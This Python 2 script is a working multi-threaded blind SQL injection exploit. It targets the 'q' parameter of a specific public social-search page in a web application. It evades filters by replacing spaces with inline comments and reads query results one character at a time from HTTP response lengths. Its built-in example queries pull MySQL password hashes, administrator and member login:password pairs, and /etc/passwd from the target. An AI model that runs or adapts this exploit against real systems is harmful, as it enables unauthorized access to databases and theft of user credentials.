import requests, sys, re, time, timeit
from multiprocessing import Process, Manager, Value

resultIteration=0
Results=dict()
masterResults=[]
incrementResult=Value('i',0)


#*****************UPDATE PARAMETERS HERE:*****************
content_length_good_min = 20	#Length cutoff of the HTTP response for a true/correct query using blind SQLI
vulnURL="http://%s/APP/mods/_standard/social/index_public.php?q=%s"	#Alternate Injection Point: "http://%s/APP/mods/_standard/social/index_public.php?search_friends=%s" 
vulnQuery="test')/**/or/**/(ascii(substring((select/**/%s),{},1)))=[CHAR]%%23"
finalQueryEncoding = [(' ','/**/')]	#Add any characters to change here as a tuple pair (for HTTP request filter/firewall evasion)
startCharacterOffset=0	#default 0; for if you want to collect only a portion of a file (# of characters in to start)
processesToOpen=40	#not recommended to go above 50 or so...
#*********************************************************

exampleQueries = """
=========================================SAMPLE QUERIES (mySQL)===========================================

Regular Queries (Single-Result):
=================================================================
"user()"
"system_user()"
"version()"
"database()"
"@@hostname"
"@@datadir"
"schema()"
"LOAD_FILE('/etc/passwd')"
=================================================================

Limit Queries (Multi-Result) -> script automatically increments (only include 'LIMIT'):
	*Alternative: use group_concat
=================================================================
"concat(host, char(58), user, char(58), password) FROM mysql.user LIMIT"
"schema_name FROM information_schema.schemata LIMIT"
'table_name from information_schema.tables LIMIT'
'user FROM mysql.user LIMIT'
"concat(login, char(58), password) FROM APP.AT_admins LIMIT"
"concat(login, char(58), password) FROM APP.AT_members LIMIT"
	
**Databases, Tables, and Columns: "concat(table_schema, char(58), table_name, char(58), column_name) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT"
Databases: "schema_name FROM information_schema.schemata LIMIT"
	OR:  "group_concat(schema_name) from information_schema.schemata"
Tables: "table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT" 
	Or: "TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT" 
Columns: "column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT"
Data: "column1 FROM table1 LIMIT"
	ex. "concat(login, char(58), password) FROM APP.AT_admins LIMIT"
	From another database: "column1 FROM database2.table1 LIMIT"
Users: "user FROM mysql.user LIMIT"
Password Hashes (mysql): "concat(host, char(58), user, char(58), password) FROM mysql.user LIMIT"
==================================================================================================
"""

def doTheSQLI(vulnQuery):
	global ip, content_length_good_min, vulnURL, finalQueryEncoding
	testChars=list(range(32,126))	#tests readable ascii characters, plus \n
	testChars.insert(0,10)
	for L in finalQueryEncoding:
		vulnQuery=vulnQuery.replace(L[0],L[1])	#does the final character encoding just prior to sending the requests
	for j in testChars:
		target = vulnURL % (ip, vulnQuery.replace("[CHAR]", str(j)))	#tests every ascii character candidate for a single character within the query results
		r=n=0
		Sleep=5
		while not r:	#keep requesting until it works
			try:
				r = requests.get(target, timeout=5)
			except requests.exceptions.Timeout:
				sys.stdout.write('.')
				sys.stdout.flush()
				time.sleep(Sleep+n*Sleep)		#letting the server recover
				n+=1
		content_length = int(r.headers['Content-Length'])
		if (content_length > content_length_good_min):	#***This is where we distinguish between true query responses and false ones based on the HTTP response length***
			return j
	return None

def getChar(p):
	global mySubQuery, vulnQuery, incrementResult, Results
	workingVulnQuery = vulnQuery % mySubQuery
	extracted_num = doTheSQLI(workingVulnQuery.format(p+1))	#substitute in the character #/position within the results that we're testing for
	if str(extracted_num).isdigit():
		extracted_char = chr(extracted_num)
		return extracted_char	#return the true ascii character that we determined
	else:	#if we try to determine a character #/position that doesn't exist within the results, None is returned and we know to increment if expecting another result (with Limit queries)
		if 'LIMIT' in workingVulnQuery:
			incrementResult.acquire()
			incrementResult.value=1
			incrementResult.release()
		return None

def updateChar(p):	#Calculates a character and updates our running results dictionary
	global Results
	c=getChar(p)		
	Results[p]=c
	if c:
		resultsDict=dict(Results)
		print ''.join([resultsDict[x] for x in sorted(resultsDict) if resultsDict[x]])	#prints realtime results to screen

def main():
	global ip, vulnURL, vulnQuery, mySubQuery, content_length_good_min, startCharacterOffset, processesToOpen, masterResults, incrementResult, resultIteration, Results
	if len(sys.argv) != 3:
		print "(+) usage: %s <target> <SELECT-Query Args>" % sys.argv[0]
		print "(+) eg: %s 192.168.121.103 \"LOAD_FILE('/etc/passwd')\"" % sys.argv[0]
		printExamples = input("\n(0): Quit and re-enter\n(1): Show Example Select-Queries\n\nYour Choice: ")
		if int(printExamples):
			print exampleQueries
		sys.exit(-1)
		
		
	ip = sys.argv[1]
	mySubQuery = sys.argv[2]
	if 'limit' in mySubQuery.lower():
		limitPos=mySubQuery.lower().find('limit')
		mySubQuery=mySubQuery[:limitPos+5]
		mySubQuery=re.sub('limit', "LIMIT %s,1" % str(resultIteration), mySubQuery, flags=re.IGNORECASE)	#First Limit # is record offset; second is number of records to display (1 for us)
	print "(+) Retrieving %s ..." % mySubQuery	
	start = timeit.default_timer()	
	processes=[]
	startingPoints=[x+startCharacterOffset for x in list(range(processesToOpen))]	#character spaces within the query result to start searching for
	while True:	#each iteration calculates #processesToOpen characters from the query result; keeps running until it starts calculating non-character (None) results
		if incrementResult.value:
			startingPoints=[x+startCharacterOffset for x in list(range(processesToOpen))]  #resets character positions to find within the row after incrementing to the next result; offset is unlikely to be used here
			incrementResult.value=0	
			mySubQuery=mySubQuery.replace('LIMIT %d' % resultIteration, 'LIMIT %d' % (resultIteration+1))	#increment the LIMIT portion of the query
			print "\nTrying next Result: %s" % re.search('LIMIT [,\d]*', mySubQuery).group(0)
			resultIteration+=1
			Results=dict()	#clears the running Results dictionary for the next result (already added to masterResults)
		Results=Manager().dict(Results)
		for p in startingPoints:
			pr=Process(target=updateChar, args=(p,))
			pr.start()
			processes.append(pr)
		for pr in processes:
			pr.join()	#wait for it to finish before continuing
		startingPoints=[x+processesToOpen for x in startingPoints[:]]	#updates to next set of characters to solve (for if result is longer than #processesToOpen characters)
		Results=dict(Results)
		myResults=[Results[x] for x in sorted(Results)]
		parsedResults=[x for x in myResults if x]	#ignores the None results for non-characters
		if None in myResults:	#checking whether to end the search (for a single result) or increment the result (for Limit results)
			masterResults.append(''.join(parsedResults))
			if 'LIMIT' in mySubQuery:
				if len(parsedResults)==0:
					break
				print "\nRetrieved so far:"
				print '\n'.join(masterResults)+'\n'
			else:
				break
		else:
			print ''.join(parsedResults)
			if len(masterResults) > 0:
				print "\nRetrieved so far:"
				print '\n'.join(masterResults)+'\n'

	print "\n\n(+) Complete:\n"
	print '\n'.join(masterResults)+'\n'
	stop = timeit.default_timer()
	print('Total Time: ', stop - start)
	print "with %d processes" %processesToOpen


if __name__ == "__main__":
	main()
